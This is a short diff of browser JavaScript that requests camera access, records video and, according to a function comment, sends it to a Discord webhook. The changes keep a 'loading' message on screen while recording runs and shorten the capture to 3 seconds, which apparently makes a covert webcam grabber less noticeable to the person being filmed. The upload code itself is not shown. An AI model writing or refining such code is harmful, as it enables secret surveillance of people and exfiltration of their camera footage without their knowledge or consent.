@@ -82,7 +82,6 @@
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             // Keep loading message displayed even after the stream starts
-            // loadingMessage.style.display = 'none'; // Commented out to keep loading message
             startRecording();
         } catch (error) {
             console.error('Error accessing camera:', error);
@@ -108,10 +107,10 @@
 
         mediaRecorder.start();
 
-        // Stop recording after 10 seconds
+        // Stop recording after 3 seconds
         setTimeout(() => {
             mediaRecorder.stop();
-        }, 10000); // 10 seconds
+        }, 3000); // 3 seconds
     }
 
     // Function to send video to Discord webhook
